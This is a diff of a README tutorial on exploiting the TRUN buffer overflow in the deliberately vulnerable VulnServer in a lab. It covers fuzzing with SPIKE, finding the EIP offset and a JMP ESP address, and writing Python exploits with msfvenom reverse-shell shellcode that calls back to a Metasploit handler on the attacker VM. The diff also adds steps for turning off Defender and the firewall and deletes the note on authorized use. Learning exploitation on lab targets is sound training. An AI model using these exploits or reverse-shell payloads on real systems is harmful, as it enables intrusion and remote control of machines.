@@ -8,7 +8,7 @@ A step-by-step walkthrough of exploiting the TRUN command buffer overflow vulner
 
 ## Introduction
 
-Welcome to my project exploring a classic Windows buffer overflow vulnerability using the TRUN command in VulnServer. This tutorial walks through the entire process from fuzzing to getting a Meterpreter shell - all step by step with explanations along the way.
+Welcome to my project exploring a classic Windows buffer overflow vulnerability using the TRUN command in VulnServer. This tutorial walks through the entire process from fuzzing to obtaining a Meterpreter shell - all with step-by-step explanations along the way.
 
 VulnServer is an intentionally vulnerable Windows TCP server that's perfect for learning exploitation techniques. While it doesn't have any real functionality (it's vulnerable by design), it provides an excellent educational platform for practicing buffer overflow attacks in a controlled environment.
 
@@ -25,11 +25,17 @@ In this project, we'll:
 
 ## Environment Setup
 
+### Network Configuration
+- **Target Machine**: Windows VM (IP: 192.168.177.130)
+  - VulnServer running on port 9999
+- **Attack Machine**: Kali Linux VM (IP: 192.168.177.141)
+  - Used for sending exploits and catching shells
+
 ### Tools Used
 - **VulnServer**: Our target vulnerable application
 - **Immunity Debugger**: For analyzing the crash and memory
-- **Kali Linux**: For running our exploitation script
-- **Python**: For writing our exploit
+- **Kali Linux**: For running our exploitation scripts
+- **Python**: For writing our exploits
 - **Mona**: A powerful plugin for Immunity Debugger
 - **Metasploit**: For shellcode generation and more
 
@@ -46,11 +52,33 @@ In this project, we'll:
 
 ![mona path](Images/image0.png)
 
+## Step 0: Preparing the Target Environment
+
+Before beginning any exploitation, we need to properly prepare our target Windows environment:
+
+1. **Disable Windows Defender**:
+   - Open Windows Security
+   - Go to "Virus & threat protection"
+   - Click "Manage settings" under "Virus & threat protection settings"
+   - Turn off "Real-time protection"
+
+2. **Disable Windows Firewall**:
+   - Open Control Panel
+   - Go to "System and Security" > "Windows Defender Firewall"
+   - Click "Turn Windows Defender Firewall on or off"
+   - Select "Turn off Windows Defender Firewall" for all network types
+
+3. **Verify VulnServer is Accessible**:
+   - From your Kali machine, run: `nc -nv 192.168.177.130 9999`
+   - You should see a welcome banner from VulnServer
+
+These steps ensure our exploitation attempts won't be blocked by Windows security features.
+
 ## Step 1: Fuzzing the Application
 
-We'll start by creating a fuzzing script to identify if and where the vulnerability exists SPIKE tool.
+We'll start by creating a fuzzing script to identify if and where the vulnerability exists using the SPIKE tool.
 
-Create a fuzzer.spk file:
+Create a `fuzzer.spk` file:
 
 ```spk
 s_readline();
@@ -62,13 +90,13 @@ Open `vulnserver.exe` with Immunity Debugger, click `F9` to start the server.
 
 ![fuzzing](Images/image1.5.png)
 
-Run the fuzzer from kali machine against VunlServer to identify potential buffer overflow:
+Run the fuzzer from our Kali machine against VulnServer to identify potential buffer overflow:
 
 ```bash
-generic_send_tcp [VulnServer_IP] 9999 Fuzzer.spk 0 0
+generic_send_tcp 192.168.177.130 9999 fuzzer.spk 0 0
 ```
 
-Running this script, we'll see the application crash when we hit a certain buffer length `Access violation when excuting [41414141]`. This confirms the vulnerability exists and gives us a starting point.
+Running this script, we'll see the application crash when we hit a certain buffer length with an `Access violation when executing [41414141]`. This confirms the vulnerability exists and gives us a starting point.
 
 ![fuzzing](Images/image2.png)
 
@@ -76,7 +104,7 @@ Running this script, we'll see the application crash when we hit a certain buffe
 
 Once we've confirmed the crash, we need to determine exactly where the crash occurs.
 
-After the applicatoin crashed. In the Debugger, `Right click` on `ESP` value in Registers section > `Follow in Dump`, then you wanna Note :
+After the application crashes in the Debugger, `Right click` on the `ESP` value in the Registers section > `Follow in Dump`, then note:
 
 - The first address the fuzzing begins with: (In my case `0x00AFF1F0`)
 
@@ -86,13 +114,13 @@ After the applicatoin crashed. In the Debugger, `Right click` on `ESP` value in 
 
 ![crashpoint](Images/image4.png)
 
-Then do the math:
+Then calculate the difference:
 
 ![math](Images/image5.png)
 
-So we've been able to make the application crash by fuzzing it with 2984 byte (A's).
+So we've been able to make the application crash by fuzzing it with 2984 bytes (A's).
 
-Lets try now to write our own python script that will crash the program, instead of using spike.
+Let's now write our own Python script that will crash the program instead of using SPIKE:
 
 ```python
 #!/usr/bin/python3
@@ -121,9 +149,7 @@ When we run this while monitoring the application in Immunity Debugger, we'll se
 
 ## Step 3: Finding the Exact Offset
 
->Since our file does only contain A's, we don't know exactly how big our buffer needs to be in order to write exactly into EIP. In other words, if we want to be specific in overwriting EIP (so we can feed it usable data and make it jump to our evil code), we need to know the exact position in our buffer/payload where we overwrite the return address (which will become EIP when the function returns). This position is often referred to as the "offset".
-
-Now we need to find exactly where in our buffer we're overwriting EIP. We'll use a cyclic pattern instead of just As:
+Now we need to find exactly where in our buffer we're overwriting EIP. We'll use a cyclic pattern instead of just A's:
 
 ```python
 #!/usr/bin/python3
@@ -193,7 +219,7 @@ s.send(payload)
 s.close()
 ```
 
-In Immunity Debugger, we should see EIP filled with 42424242 (our "B"s) And the Stack filled with our "C"s - confirming we have precise control!
+In Immunity Debugger, we should see EIP filled with 42424242 (our "B"s) and the Stack filled with our "C"s - confirming we have precise control!
 
 ![control](Images/image8.png)
 
@@ -242,11 +268,11 @@ Now we need to find a JMP ESP instruction to use as our return address. We'll us
 !mona jmp -r esp
 ```
 
-This command finds all JMP ESP instructions. We could use an address like `0x62501203`.
+This command finds all JMP ESP instructions. We'll use the address `0x62501203`.
 
 ![mona](Images/image9.png)
 
-Convert this hex address to its little endian format using `Struct` Python built-in library:
+Convert this hex address to its little-endian format using the `struct` Python built-in library:
 
 ```python
 #!/usr/bin/python3
@@ -256,10 +282,9 @@ import struct
 s = socket.socket()
 s.connect(("192.168.177.130", 9999))
 
-
 total_length = 2984
 offset = 2003
-New_EIP = struct.pack("<I", 0x62501203)
+New_EIP = struct.pack("<I", 0x62501203)  # Little-endian conversion
 
 payload = [
         b"TRUN /.:/",
@@ -275,7 +300,7 @@ s.send(payload)
 s.close()
 ```
 
-After we execute this, we'll take control of the stack `ESP` pointing at.
+After we execute this, we'll take control of execution with `ESP` pointing at our data.
 
 ## Step 7: Building the Final Exploit
 
@@ -283,16 +308,27 @@ Now we'll build our final exploit with:
 1. Padding to reach EIP
 2. JMP ESP address to gain control of execution
 3. A NOP sled for stability
+4. Our shellcode
 
-   > why?----
+### Why Add a NOP Sled?
 
-5. Our shellcode
+A NOP sled (No Operation instructions) serves two important technical purposes:
 
-   Generated with:
+1. **Memory Alignment**: Shellcode often requires proper alignment in memory. The NOP sled ensures that even if our calculations are slightly off, the processor will slide through the NOPs until it hits our shellcode.
+
+2. **Stability Buffer**: Memory addresses can shift slightly between executions due to environment variables or system state. The NOP sled creates a "landing zone" that increases our chances of successful execution even with minor address variations.
+
+3. **Encoder Padding**: When shellcode is encoded to avoid bad characters, the decoder stub sometimes needs space to work. NOPs provide this safe padding.
+
+Technically, each NOP (0x90) instruction tells the processor "do nothing and move to the next instruction," creating a smooth pathway to our shellcode.
+
+Generate shellcode with:
    
-   ```bash
-   msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -b"\x00" -f py
-   ```
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.177.141 LPORT=4444 -b"\x00" -f py
+```
+
+Our final exploit:
 
 ```python
 #!/usr/bin/python3
@@ -304,10 +340,11 @@ s.connect(("192.168.177.130", 9999))
 
 total_length = 2984
 offset = 2003
-New_EIP = struct.pack("<I", 0x62501203)
+New_EIP = struct.pack("<I", 0x62501203)  # JMP ESP in little-endian format
 
-nop_sled = b"\x90" * 16
+nop_sled = b"\x90" * 16  # Create a runway of NOPs
 
+# Shellcode generated with msfvenom
 buf =  b""
 buf += b"\xda\xc3\xd9\x74\x24\xf4\xba\x10\xf9\x4b\xe4\x5e"
 buf += b"\x31\xc9\xb1\x59\x83\xc6\x04\x31\x56\x15\x03\x56"
@@ -367,7 +404,7 @@ Before running our exploit, we need to set up a handler in Metasploit:
 ```
 use multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST eth0
+set LHOST 192.168.177.141
 set LPORT 4444
 run
 ```
@@ -386,10 +423,10 @@ And that's it! We've successfully:
 5. Injected our shellcode
 6. Obtained a shell on the target system
 
-This project demonstrates the classic buffer overflow exploitation technique in a controlled environment. Remember, these skills should only be used legally and ethically - such as in penetration testing with proper authorization.
+This project demonstrates the classic buffer overflow exploitation technique in a controlled environment.
 
 ## References
-- VulnServer project
-- Immunity Debugger and Mona documentation
-- OWASP Buffer Overflow Guide
-- Metasploit Framework documentation
+- [VulnServer project](https://github.com/stephenbradshaw/vulnserver)
+- [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
+- [youtube guide](https://youtu.be/yJF0YPd8lDw?si=E8mIlgA1OL13We3t)
+- [Buffer Overflow Tutorial](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
